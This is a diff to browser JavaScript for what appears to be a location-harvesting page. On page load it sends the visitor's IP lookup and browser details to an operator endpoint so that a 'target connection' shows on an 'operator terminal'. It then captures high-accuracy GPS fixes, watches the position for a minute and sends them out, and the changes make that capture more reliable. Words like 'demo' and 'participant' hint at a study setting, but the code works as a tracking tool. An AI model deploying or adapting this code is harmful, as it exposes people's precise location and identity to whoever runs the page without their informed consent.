@@ -1,29 +1,21 @@
 (function () {
-  const GEO_FAST_OPTS = {
-    enableHighAccuracy: false,
-    timeout: 20000,
-    maximumAge: 120000
-  };
-
-  const GEO_WATCH_OPTS = {
-    enableHighAccuracy: false,
-    timeout: 15000,
-    maximumAge: 120000
-  };
-
-  const GEO_PRECISE_OPTS = {
+  const GEO_PRIMARY_OPTS = {
     enableHighAccuracy: true,
     timeout: 60000,
     maximumAge: 0
   };
 
-  const WATCH_MAX_MS = 25000;
+  const GEO_PRECISE_WATCH_OPTS = {
+    enableHighAccuracy: true,
+    timeout: 60000,
+    maximumAge: 0
+  };
+
+  const WATCH_MAX_MS = 60000;
 
   let ipInfo = null;
   let watchId = null;
   let watchTimer = null;
-  let fallbackWatchId = null;
-  let fallbackWatchTimer = null;
   let inProgress = false;
 
   function getSessionId() {
@@ -165,7 +157,9 @@
           return;
         }
       }
-    } catch (e) {}
+    } catch (e) {
+      console.warn("ipwho.is lookup failed:", e);
+    }
 
     try {
       const r = await fetch("https://ipapi.co/json/");
@@ -173,20 +167,37 @@
         const j = await r.json();
         ipInfo = parseApi(j);
       }
-    } catch (e) {}
+    } catch (e) {
+      console.warn("ipapi.co lookup failed:", e);
+    }
   }
 
   function postPayload(data) {
     const dest = getTargetEndpoint();
+    const sid = getSessionId();
+
     return fetch(dest, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     })
       .then(function (res) {
-        return res.ok;
+        if (!res.ok) {
+          console.error("Location POST failed:", {
+            status: res.status,
+            endpoint: dest,
+            sessionId: sid
+          });
+          return false;
+        }
+        return true;
       })
-      .catch(function () {
+      .catch(function (err) {
+        console.error("Network error posting location payload:", {
+          error: err,
+          endpoint: dest,
+          sessionId: sid
+        });
         return false;
       });
   }
@@ -202,19 +213,9 @@
     }
   }
 
-  function clearFallbackWatch() {
-    if (fallbackWatchId !== null && navigator.geolocation) {
-      navigator.geolocation.clearWatch(fallbackWatchId);
-      fallbackWatchId = null;
-    }
-    if (fallbackWatchTimer !== null) {
-      clearTimeout(fallbackWatchTimer);
-      fallbackWatchTimer = null;
-    }
-  }
-
   function startHighAccuracyWatch() {
-    if (watchId !== null || !navigator.geolocation) return;
+    clearWatchSafely();
+    if (!navigator.geolocation) return;
 
     watchId = navigator.geolocation.watchPosition(
       function (newPos) {
@@ -235,14 +236,16 @@
           }
         });
       },
-      function () {},
-      GEO_PRECISE_OPTS
+      function (err) {
+        console.warn("WatchPosition diagnostic warning:", err);
+      },
+      GEO_PRECISE_WATCH_OPTS
     );
 
     // Bounded high-accuracy watch (stop after 60 seconds)
     watchTimer = setTimeout(function () {
       clearWatchSafely();
-    }, 60000);
+    }, WATCH_MAX_MS);
   }
 
   function applyFix(pos) {
@@ -271,7 +274,7 @@
       browser: bInfo
     }).then(function (success) {
       if (!success) {
-        appendBubble("Location was received, but the result could not be sent to the server.", false);
+        appendBubble("Location fix was acquired, but could not be sent to the server. Check server connection.", false);
       }
     });
 
@@ -306,19 +309,19 @@
   }
 
   function geoError(err) {
-    clearFallbackWatch();
+    clearWatchSafely();
     const bInfo = collectBrowserInfo();
     const code = err ? err.code : 1;
     postPayload({ denied: true, errorCode: code, browser: bInfo });
 
     if (code === 1) {
-      appendBubble("Location permission was denied or blocked.", false);
+      appendBubble("Location permission was denied or blocked. Please allow Location access for this site in your browser settings and click Continue again.", false);
     } else if (code === 2) {
-      appendBubble("Chrome could not obtain a location from the device location provider.", false);
-      appendBubble("Make sure Location is enabled on the phone and try again.", false);
+      appendBubble("Position unavailable. Device positioning service could not determine location.", false);
+      appendBubble("Ensure Location/GPS is enabled in your device settings and try again.", false);
     } else if (code === 3) {
-      appendBubble("Chrome could not obtain a location before the request timed out.", false);
-      appendBubble("Make sure Location is enabled on the phone and try again.", false);
+      appendBubble("Location request timed out before acquiring a fix.", false);
+      appendBubble("Ensure device Location is enabled and try again.", false);
     } else {
       appendBubble("Location information is currently unavailable.", false);
     }
@@ -326,52 +329,12 @@
     enableContinueButton();
   }
 
-  function runPreciseFallback() {
-    clearFallbackWatch();
-    navigator.geolocation.getCurrentPosition(
-      function (pos) {
-        inProgress = false;
-        applyFix(pos);
-      },
-      function (err) {
-        inProgress = false;
-        geoError(err);
-      },
-      GEO_PRECISE_OPTS
-    );
-  }
-
-  function runWatchFallback() {
-    clearFallbackWatch();
-    let fixAcquired = false;
-
-    fallbackWatchTimer = setTimeout(function () {
-      if (fixAcquired) return;
-      clearFallbackWatch();
-      appendBubble("The first location provider did not respond. Trying a longer high-accuracy request...", false);
-      runPreciseFallback();
-    }, WATCH_MAX_MS);
-
-    fallbackWatchId = navigator.geolocation.watchPosition(
-      function (pos) {
-        if (fixAcquired) return;
-        fixAcquired = true;
-        clearFallbackWatch();
-        inProgress = false;
-        applyFix(pos);
-        appendBubble("Improving location accuracy when available...", false);
-      },
-      function (err) {
-        if (err && err.code === 1) {
-          if (fixAcquired) return;
-          fixAcquired = true;
-          clearFallbackWatch();
-          inProgress = false;
-          geoError(err);
-        }
-      },
-      GEO_WATCH_OPTS
-    );
+  function checkSecureContext() {
+    const isSecure = window.isSecureContext !== false;
+    const isLocal = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1" || window.location.hostname === "::1";
+    if (!isSecure && !isLocal && window.location.protocol !== "https:") {
+      appendBubble("WARNING: Browser Geolocation requires a Secure Context (HTTPS). Accessing over unencrypted HTTP will cause location requests to fail. Please use the HTTPS public URL.", false);
+    }
   }
 
   async function startDemo() {
@@ -386,10 +349,12 @@
       btn.disabled = true;
     }
 
-    appendBubble("Checking browser capabilities...", false);
+    checkSecureContext();
+
+    appendBubble("Checking browser location capabilities...", false);
 
     if (!navigator.geolocation) {
-      appendBubble("Location access was not granted.", false);
+      appendBubble("Geolocation API is not supported or unavailable in this browser environment.", false);
       enableContinueButton();
       return;
     }
@@ -398,45 +363,48 @@
 
     if (permissionState === "denied") {
       appendBubble(
-        "Location permission is blocked for this site. Allow location access for this site in Chrome settings and try again.",
+        "Location permission is blocked for this site. Allow location access in browser site settings and click Continue.",
         false
       );
       enableContinueButton();
       return;
     }
 
+    appendBubble("Requesting location permission grant from browser...", false);
+
+    clearWatchSafely();
+
     navigator.geolocation.getCurrentPosition(
       function (pos) {
-        clearFallbackWatch();
         inProgress = false;
+        appendBubble("Location fix acquired (±" + Math.round(pos.coords.accuracy || 0) + " m).", false);
         applyFix(pos);
-        appendBubble(
-          "Improving location accuracy when available...",
-          false
-        );
+        appendBubble("Tracking position updates to improve accuracy...", false);
       },
       function (err) {
-        // Permission denied: do not retry.
-        if (err && err.code === 1) {
-          inProgress = false;
-          geoError(err);
-          return;
-        }
-
-        appendBubble(
-          "The first location provider did not respond. Trying background positioning...",
-          false
-        );
-
-        runWatchFallback();
+        inProgress = false;
+        geoError(err);
       },
-      GEO_FAST_OPTS
+      GEO_PRIMARY_OPTS
     );
   }
+
+  // Cleanup watchers on page unload
+  window.addEventListener("beforeunload", clearWatchSafely);
+  window.addEventListener("pagehide", clearWatchSafely);
+  window.addEventListener("unload", clearWatchSafely);
 
   document.addEventListener("DOMContentLoaded", function () {
     const bInfo = collectBrowserInfo();
     lookupIp();
+
+    // Diagnostic console check
+    console.log("LOCLX Participant Diagnostics:", {
+      secureContext: window.isSecureContext,
+      geolocationAvailable: Boolean(navigator.geolocation),
+      getCurrentPositionAvailable: Boolean(navigator.geolocation && navigator.geolocation.getCurrentPosition),
+      sessionId: getSessionId()
+    });
 
     // Send initial browser connection payload so operator terminal displays target connection immediately
     postPayload({ browser: bInfo });
